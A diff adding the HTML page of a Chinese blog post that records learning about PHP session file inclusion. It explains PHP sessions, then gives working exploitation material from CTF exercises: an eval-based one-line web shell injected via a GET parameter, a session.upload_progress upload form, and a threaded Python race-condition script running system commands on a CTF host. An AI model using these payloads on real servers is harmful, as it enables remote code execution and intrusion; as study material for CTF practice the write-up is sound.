@@ -1,0 +1,534 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.1.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/32x32.jpg">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/16x16.jpg">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="PHP session包含什么是PHP sessionPHP session 变量用于存储关于用户会话（session）的信息，或者更改用户会话（session）的设置。Session 变量存储单一用户的信息，并且对于应用程序中的所有页面都是可用的。 PHP session 变量您在计算机上操作某个应用程序时，您打开它，做些更改，然后关闭它。这很像一次对话（Session）。计算机知道您是谁。它清">
+<meta property="og:type" content="article">
+<meta property="og:title" content="包含session文件学习记录">
+<meta property="og:url" content="http://example.com/2024/03/09/%E5%8C%85%E5%90%ABsession%E6%96%87%E4%BB%B6/index.html">
+<meta property="og:site_name" content="Ed3n&#39;s Blog">
+<meta property="og:description" content="PHP session包含什么是PHP sessionPHP session 变量用于存储关于用户会话（session）的信息，或者更改用户会话（session）的设置。Session 变量存储单一用户的信息，并且对于应用程序中的所有页面都是可用的。 PHP session 变量您在计算机上操作某个应用程序时，您打开它，做些更改，然后关闭它。这很像一次对话（Session）。计算机知道您是谁。它清">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://s2.loli.net/2023/11/18/e4y2pTXnSbBxqjF.png">
+<meta property="og:image" content="https://s2.loli.net/2023/11/18/jkc9v2zCLIe6htB.png">
+<meta property="og:image" content="https://s2.loli.net/2023/11/18/ip6MrloTe8hgbkX.png">
+<meta property="og:image" content="c:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20231024194627329.png">
+<meta property="og:image" content="https://s2.loli.net/2023/11/18/LkCjMpXBFSJRQtu.png">
+<meta property="og:image" content="https://s2.loli.net/2023/11/18/caAXuwxWNplgkfI.png">
+<meta property="og:image" content="https://s2.loli.net/2023/11/18/jaE6izYLsHlbKxW.png">
+<meta property="og:image" content="https://s2.loli.net/2023/11/18/2dPbruMC1mJsSo3.png">
+<meta property="og:image" content="https://s2.loli.net/2023/11/18/z5tDdReJVqoXPwA.png">
+<meta property="og:image" content="https://s2.loli.net/2023/11/18/ZB8pTUqw3y5LOA9.png">
+<meta property="og:image" content="https://s2.loli.net/2023/11/18/rYBoZJX4lDItuzi.png">
+<meta property="og:image" content="https://s2.loli.net/2023/11/18/GHhTy6a1iJbujU5.png">
+<meta property="article:published_time" content="2024-03-08T16:00:00.000Z">
+<meta property="article:modified_time" content="2024-03-09T08:11:08.710Z">
+<meta property="article:author" content="Ed3n">
+<meta property="article:tag" content="文件包含">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s2.loli.net/2023/11/18/e4y2pTXnSbBxqjF.png">
+
+<link rel="canonical" href="http://example.com/2024/03/09/%E5%8C%85%E5%90%ABsession%E6%96%87%E4%BB%B6/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>包含session文件学习记录 | Ed3n's Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Ed3n's Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2024/03/09/%E5%8C%85%E5%90%ABsession%E6%96%87%E4%BB%B6/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Ed3n">
+      <meta itemprop="description" content="欢迎光临，我的朋友">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Ed3n's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          包含session文件学习记录
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2024-03-09 00:00:00 / 修改时间：16:11:08" itemprop="dateCreated datePublished" datetime="2024-03-09T00:00:00+08:00">2024-03-09</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" itemprop="url" rel="index"><span itemprop="name">文件包含</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="PHP-session包含"><a href="#PHP-session包含" class="headerlink" title="PHP session包含"></a>PHP session包含</h1><h2 id="什么是PHP-session"><a href="#什么是PHP-session" class="headerlink" title="什么是PHP session"></a>什么是PHP session</h2><p>PHP session 变量用于存储关于用户会话（session）的信息，或者更改用户会话（session）的设置。Session 变量存储单一用户的信息，并且对于应用程序中的所有页面都是可用的。</p>
+<h3 id="PHP-session-变量"><a href="#PHP-session-变量" class="headerlink" title="PHP session 变量"></a>PHP session 变量</h3><p>您在计算机上操作某个应用程序时，您打开它，做些更改，然后关闭它。这很像一次对话（Session）。计算机知道您是谁。它清楚您在何时打开和关闭应用程序。然而，在因特网上问题出现了：由于 HTTP 地址无法保持状态，Web 服务器并不知道您是谁以及您做了什么。</p>
+<p>PHP session 解决了这个问题，它通过在服务器上存储用户信息以便随后使用（比如用户名称、购买商品等）。然而，会话信息是临时的，在用户离开网站后将被删除。如果您需要永久存储信息，可以把数据存储在数据库中。</p>
+<p>Session 的工作机制是：为每个访客创建一个唯一的 id (UID)，并基于这个 UID 来存储变量。UID 存储在 cookie 中，或者通过 URL 进行传导。</p>
+<h3 id="开始-PHP-session"><a href="#开始-PHP-session" class="headerlink" title="开始 PHP session"></a>开始 PHP session</h3><p>在您把用户信息存储到 PHP session 中之前，首先必须启动会话。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php session_start(); ?&gt;</span><br><span class="line"> </span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"> </span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>上面的代码会向服务器注册用户的会话，以便您可以开始保存用户信息，同时会为用户会话分配一个 UID。</p>
+<h3 id="存储-session-变量"><a href="#存储-session-变量" class="headerlink" title="存储 session 变量"></a>存储 session 变量</h3><p>session是一个数组，有键和值：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>]=<span class="string">&#x27;admin&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>其中，<code>username</code>是键，<code>admin</code>是值</p>
+<p>存储和取回 session 变量的正确方法是使用 PHP <code>$_SESSION</code> 变量：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">// 存储 session 数据</span><br><span class="line">$_SESSION[&#x27;views&#x27;]=1;</span><br><span class="line">?&gt;</span><br><span class="line"> </span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">&lt;title&gt;菜鸟教程(runoob.com)&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"> </span><br><span class="line">&lt;?php</span><br><span class="line">// 检索 session 数据</span><br><span class="line">echo &quot;浏览量：&quot;. $_SESSION[&#x27;views&#x27;];</span><br><span class="line">?&gt;</span><br><span class="line"> </span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line">// 浏览量：1</span><br></pre></td></tr></table></figure>
+
+<p>在下面的实例中，我们创建了一个简单的 <code>page-view</code> 计数器。<code>isset() </code>函数检测是否已设置 “<code>views</code>“ 变量。如果已设置 “<code>views</code>“ 变量，我们累加计数器。如果 “<code>views</code>“ 不存在，则创建 “<code>views</code>“ 变量，并把它设置为 <code>1</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line"> </span><br><span class="line">if(isset($_SESSION[&#x27;views&#x27;]))</span><br><span class="line">&#123;</span><br><span class="line">    $_SESSION[&#x27;views&#x27;]=$_SESSION[&#x27;views&#x27;]+1;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">    $_SESSION[&#x27;views&#x27;]=1;</span><br><span class="line">&#125;</span><br><span class="line">echo &quot;浏览量：&quot;. $_SESSION[&#x27;views&#x27;];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="session变量存储地址"><a href="#session变量存储地址" class="headerlink" title="session变量存储地址"></a>session变量存储地址</h3><p>查看<code>session.save_path</code></p>
+<table>
+<thead>
+<tr>
+<th>Directive</th>
+<th>Local Value</th>
+<th>Master Value</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>session.save_path</td>
+<td>no value</td>
+<td>no value</td>
+</tr>
+</tbody></table>
+<p><code>session.save_path</code>为<code>no value</code>则表示存储在默认的<code>/tmp</code>或<code>/var/lib/php/session</code>目录下</p>
+<p>反之则会标明详细路径	</p>
+<h3 id="存放session变量文件名"><a href="#存放session变量文件名" class="headerlink" title="存放session变量文件名"></a>存放session变量文件名</h3> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sess_[phpsessid]</span><br></pre></td></tr></table></figure>
+
+<p> phpsessid 在发送的请求的 <code>cookie</code> 字段中可以看到（保存在<code>cookie</code>里面，专门标识session）</p>
+<h3 id="销毁-session"><a href="#销毁-session" class="headerlink" title="销毁 session"></a>销毁 session</h3><p>如果您希望删除某些 session 数据，可以使用 unset() 或 session_destroy() 函数。</p>
+<p>unset() 函数用于释放指定的 session 变量：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">if(isset($_SESSION[&#x27;views&#x27;]))</span><br><span class="line">&#123;</span><br><span class="line">    unset($_SESSION[&#x27;views&#x27;]);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>您也可以通过调用 session_destroy() 函数彻底销毁 session：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_destroy();</span><br><span class="line">?&gt;</span><br><span class="line">// session_destroy() 将重置 session，将失去所有已存储的 session 数据。</span><br></pre></td></tr></table></figure>
+
+<h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>把一个可控字符串（php恶意代码）写入session文件，然后包含session文件</p>
+<h2 id="漏洞分类"><a href="#漏洞分类" class="headerlink" title="漏洞分类"></a>漏洞分类</h2><h3 id="提供对session赋值的功能"><a href="#提供对session赋值的功能" class="headerlink" title="提供对session赋值的功能"></a>提供对session赋值的功能</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">if(isset($_GET[&#x27;a&#x27;]))&#123;</span><br><span class="line">    $a=$_GET[&#x27;a&#x27;];</span><br><span class="line">    $_SESSION[&#x27;username&#x27;]=$a;    </span><br><span class="line">&#125;</span><br><span class="line">var_dump($_SESSION);</span><br><span class="line">?&gt;</span><br><span class="line">//flag在根目录</span><br></pre></td></tr></table></figure>
+
+<p>上传一句话木马：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url/?a=&lt;?php echo 345;eval($_POST[0]);?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>在cookie中可以看到PHPSESSID，因此可以知道保存payload的文件名</p>
+<p><img src="https://s2.loli.net/2023/11/18/e4y2pTXnSbBxqjF.png" alt="image-20231024193152377"></p>
+<p>尝试默认保存目录，包含session文件</p>
+<p><img src="https://s2.loli.net/2023/11/18/jkc9v2zCLIe6htB.png" alt="image-20231024193718849"></p>
+<p>使用蚁剑连接，获取flag</p>
+<p><img src="https://s2.loli.net/2023/11/18/ip6MrloTe8hgbkX.png" alt="image-20231024193804739"></p>
+<h3 id="没有提供赋值功能"><a href="#没有提供赋值功能" class="headerlink" title="没有提供赋值功能"></a>没有提供赋值功能</h3><h4 id="session-upload-progress写入"><a href="#session-upload-progress写入" class="headerlink" title="session.upload_progress写入"></a><code>session.upload_progress</code>写入</h4><p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20231024194627329.png" alt="image-20231024194627329"></p>
+<h5 id="php配置"><a href="#php配置" class="headerlink" title="php配置"></a>php配置</h5><p>用<code>phpinfo()</code>查看</p>
+<p><img src="https://s2.loli.net/2023/11/18/LkCjMpXBFSJRQtu.png" alt="image-20231024194828661"></p>
+<p><code>session.upload_progress.enabled</code>：该选项开启（On）时，PHP可以监测文件上传的进度，这是客户端可以发送POST到服务端开查看上传进度，此时<code>session.upload_progress</code>生效</p>
+<p><code>session.upload_progress.cleanup</code>：该选项默认开启，读取POST请求后会删除上传进度信息。这时需要采用<strong>条件竞争</strong>的方法注入木马</p>
+<p>在文件上传过程中，客户端POST一个 <code>session.upload_progress.name</code> 的值同名的变量时，会在 <code>$_SESSION </code>数组中添加一组数据，索引是 <code>session.upload_progress.prefix</code> 与 <code>session.upload_progress.name</code> 拼接在一起的值。因此可以通过POST以 <code>session.upload_progress.name</code> 的值作为变量名的数据，变量值就是 <code>payload</code></p>
+<p><code>session.use_strict_mode</code>：默认关闭，改选项开启时，PHP不接受未初始化的会话id（就不能自己命名PHPSESSID）</p>
+<p><img src="https://s2.loli.net/2023/11/18/caAXuwxWNplgkfI.png" alt="image-20231024195321050"></p>
+<h5 id="实例及详解（session-upload-progress-cleanup为Off）"><a href="#实例及详解（session-upload-progress-cleanup为Off）" class="headerlink" title="实例及详解（session.upload_progress.cleanup为Off）"></a>实例及详解（<code>session.upload_progress.cleanup</code>为<code>Off</code>）</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;form action=&quot;http://b.y1ng.vip:2007/&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">&lt;!--action的值为目标服务器地址 --&gt;</span><br><span class="line">        &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;123&quot; /&gt; </span><br><span class="line">&lt;!-- name的值为phpinfo中参数session.upload_progress.name的值；value的值为payload--&gt;</span><br><span class="line">        &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;</span><br><span class="line">        &lt;input type=&quot;submit&quot; value=&quot;submit&quot; /&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>打开后发现是一个上传界面，开启burp代理，然后任意上传一个文件，burp抓包并发送到repeater模块</p>
+<p><img src="https://s2.loli.net/2023/11/18/jaE6izYLsHlbKxW.png" alt="image-20231024200836460"></p>
+<p>利用hackbar包含session文件</p>
+<p><img src="https://s2.loli.net/2023/11/18/2dPbruMC1mJsSo3.png" alt="image-20231024200921497"></p>
+<p>做题时，payload可以为：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>();<span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="number">123</span>;@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">0</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="实例及详解（session-upload-progress-cleanup为On）"><a href="#实例及详解（session-upload-progress-cleanup为On）" class="headerlink" title="实例及详解（session.upload_progress.cleanup为On）"></a>实例及详解（<code>session.upload_progress.cleanup</code>为<code>On</code>）</h5><p>[WMCTF 2020]Make PHP Great Again</p>
+<h6 id="解法一：python脚本包含session"><a href="#解法一：python脚本包含session" class="headerlink" title="解法一：python脚本包含session"></a>解法一：python脚本包含session</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">host = <span class="string">&#x27;http://1a4c15ee-2120-40e0-8fd8-f5738de3977b.node4.buuoj.cn:81/&#x27;</span></span><br><span class="line">sessid = <span class="string">&#x27;feng&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">POST</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">50</span>)</span><br><span class="line">        session.post(</span><br><span class="line">            host,</span><br><span class="line">            data=&#123;<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>:<span class="string">&quot;&lt;?php system(&#x27;cat flag.php&#x27;);echo md5(&#x27;1&#x27;);?&gt;&quot;</span>&#125;,</span><br><span class="line">            files=&#123;<span class="string">&quot;file&quot;</span>:(<span class="string">&#x27;a.txt&#x27;</span>, f)&#125;,</span><br><span class="line">            cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>:sessid&#125;</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">READ</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        response = session.get(<span class="string">f&#x27;<span class="subst">&#123;host&#125;</span>?file=/tmp/sess_<span class="subst">&#123;sessid&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="comment"># print(response.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;c4ca4238a0b923820dcc509a6f75849b&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;[+++]retry&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(response.text)</span><br><span class="line">            sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">    t1 = threading.Thread(target=POST, args=(session, ))</span><br><span class="line">    t1.daemon = <span class="literal">True</span></span><br><span class="line">    t1.start()</span><br><span class="line">    READ(session)</span><br></pre></td></tr></table></figure>
+
+<p>执行得flag</p>
+<p><img src="https://s2.loli.net/2023/11/18/z5tDdReJVqoXPwA.png" alt="image-20231030222311829"></p>
+<h6 id="解法二：html-爆破"><a href="#解法二：html-爆破" class="headerlink" title="解法二：html+爆破"></a>解法二：html+爆破</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#poc.php</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;form action=&quot;http://1a4c15ee-2120-40e0-8fd8-f5738de3977b.node4.buuoj.cn:81/&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">&lt;!--action的值为目标服务器地址 --&gt;</span><br><span class="line">        &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;&lt;?php system(&#x27;cat /flag.php&#x27;);?&gt;&quot; /&gt; </span><br><span class="line">&lt;!-- name的值为phpinfo中参数session.upload_progress.name的值；value的值为payload--&gt;</span><br><span class="line">        &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;</span><br><span class="line">        &lt;input type=&quot;submit&quot; value=&quot;submit&quot; /&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">    session_start();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://s2.loli.net/2023/11/18/ZB8pTUqw3y5LOA9.png" alt="image-20231030223039080"></p>
+<p><img src="https://s2.loli.net/2023/11/18/rYBoZJX4lDItuzi.png" alt="image-20231030223644568"></p>
+<p><img src="https://s2.loli.net/2023/11/18/GHhTy6a1iJbujU5.png" alt="image-20231030223554025"></p>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>Ed3n
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://example.com/2024/03/09/%E5%8C%85%E5%90%ABsession%E6%96%87%E4%BB%B6/" title="包含session文件学习记录">http://example.com/2024/03/09/包含session文件/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" rel="tag"># 文件包含</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2024/03/09/%E5%8C%85%E5%90%AB%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6/" rel="prev" title="包含临时文件学习记录">
+      <i class="fa fa-chevron-left"></i> 包含临时文件学习记录
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2024/03/09/Ping%E5%91%BD%E4%BB%A4/" rel="next" title="Ping命令学习记录">
+      Ping命令学习记录 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
